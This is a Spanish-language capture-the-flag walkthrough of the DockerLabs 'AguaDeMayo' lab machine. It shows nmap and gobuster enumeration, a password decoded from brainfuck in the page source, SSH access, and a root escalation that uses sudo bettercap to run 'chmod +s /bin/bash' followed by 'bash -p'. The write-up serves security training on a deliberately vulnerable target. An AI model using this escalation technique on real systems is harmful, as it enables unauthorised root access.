# AguaDeMayo — DockerLabs.es 🐳

<img width="552" height="302" alt="1" src="https://github.com/user-attachments/assets/de362848-e3e3-4a7d-8617-a56c244b114b" />

**Plataforma**: DockerLabs | **OS**: Linux | **Dificultad**: Fácil

---

## 1. Reconocimiento

Realizamos un escaneo con nmap:

```bash
sudo nmap -p- --open --min-rate 2000 -A -sS -n -Pn 172.17.0.2 -oN escaneo.txt
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 00:52 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
|_  256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.13 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.63 seconds
```

Tenemos el puerto 22 y 80 abiertos.

Cuando entramos al servidor web nos encontramos con:

<img width="899" height="552" alt="2" src="https://github.com/user-attachments/assets/377483ae-0370-4b1f-9a2d-629134f22d66" />

Ingresamos al código fuente de la página con Ctrl+u y al final podemos ver una linea en brainfuck

<img width="1356" height="233" alt="3" src="https://github.com/user-attachments/assets/98ba1429-6cfd-430d-b1c7-73da5c995a90" />

```bash
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
```

Si interpretamos este lenguaje de programación con la página dcode.fr obtenemos como resultado “bebeaguaqueessano"

<img width="847" height="435" alt="4" src="https://github.com/user-attachments/assets/38a9a596-410b-4253-9413-edf4fc616c94" />

Después ejecutamos un fuzzing web de la siguiente forma:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt,java,jar
```

<img width="1123" height="424" alt="5" src="https://github.com/user-attachments/assets/fd735be0-18b5-4c4f-973c-e1e2ed00e3f5" />

Ingresamos al directorio /images

<img width="657" height="397" alt="6" src="https://github.com/user-attachments/assets/f729a4dd-23b9-4710-9418-59cf80eda894" />

Clickeamos en el archivo y nos lleva a una imagen con el nombre “agua_ssh”

<img width="836" height="547" alt="7" src="https://github.com/user-attachments/assets/4f1dfc1e-ca50-4a3e-84b9-f164473896f0" />

Por lo que intuimos que podemos ingresar mediante el protocolo SSH con el usuario “agua” y la contraseña “bebeaguaqueessano”

Obtenemos acceso

<img width="788" height="312" alt="8" src="https://github.com/user-attachments/assets/f13dad46-f8b2-4682-9b07-7c1beb2947e2" />

---


## 3. Escalada de Privilegios

Realizamos un sudo -l 

<img width="895" height="216" alt="9" src="https://github.com/user-attachments/assets/555903d0-d484-4926-a550-ecd9a7341a36" />

Y ejecutamos el binario:

sudo /usr/bin/bettercap

<img width="840" height="134" alt="10" src="https://github.com/user-attachments/assets/af75fcef-14a5-4629-9552-c2e91d30ad44" />

```bash
! chmod +s /bin/bash
```

Este comando lo que hace es darle permisos SUID al binario BASH

Y luego salimos de la sesión con Ctrl+c 

Ejecutamos bash -p y logramos rootear la máquina

<img width="450" height="153" alt="11" src="https://github.com/user-attachments/assets/8299233e-d183-41e9-892d-e2c0fea68a21" />



**✅ Máquina rooteada con éxito.**

---

## 4. Técnicas utilizadas

- Reconocimiento con Nmap
- Enumeración de servicios
- Escalada de privilegios
